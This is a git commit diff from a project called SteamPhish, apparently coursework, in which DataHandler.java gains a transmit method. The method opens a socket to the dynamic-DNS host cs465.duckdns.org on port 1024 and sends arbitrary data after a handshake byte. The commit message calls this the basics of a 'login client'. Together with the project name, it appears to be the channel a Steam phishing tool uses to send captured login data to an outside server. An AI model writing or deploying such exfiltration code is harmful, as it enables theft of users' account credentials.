38df9ac425fa25e81665f33c93582d0f22034157
mardiqwop <mardi.emerald@gmail.com>
2017-04-04 13:43:30 -0400

    Basics of the login client are finished

--- SteamPhish/src/DataHandler.java
+++ SteamPhish/src/DataHandler.java
@@ -2,32 +2,41 @@ import java.io.IOException;
 import java.io.InputStream;
 import java.io.OutputStream;
 import java.net.InetAddress;
+import java.net.InetSocketAddress;
 import java.net.Socket;
+import java.net.SocketAddress;
 
 public class DataHandler {
-    public DataHandler(){
+
+    private Socket sock;
+    OutputStream outputStream;
+    InputStream inputStream;
+    InetSocketAddress address;
+
+    public DataHandler() throws IOException{
         try {
-            InetAddress address = InetAddress.getByName("cs465.duckdns.org");
-            Socket sock = new Socket(address, 1024);
-            byte b;
-            b = (byte)0xfe;
-            OutputStream outputStream = sock.getOutputStream();
-            InputStream inputStream = sock.getInputStream();
-            outputStream.write(b);
+            address = new InetSocketAddress(InetAddress.getByName("cs465.duckdns.org"), 1024);
+        }
+        catch(IOException e){
+            throw new IOException(e);
+        }
+
+    }
+
+    public void transmit(String data) throws IOException{
+        sock = new Socket();
+        sock.connect(address, 10000);
+        inputStream = sock.getInputStream();
+        outputStream = sock.getOutputStream();
+        outputStream.write(0xfe);
+        if(inputStream.read() == 0xfe){
+            outputStream.write(data.getBytes());
+            outputStream.write(0xff);
             outputStream.flush();
-            if(inputStream.read() == 0xfe){
-                outputStream.write("Hello from java".getBytes());
-                outputStream.flush();
-                outputStream.write(0xff);
-                outputStream.flush();
-            }
             inputStream.close();
             outputStream.close();
             sock.close();
-
-        }
-        catch(IOException e){
-            e.printStackTrace();
         }
     }
+
 }
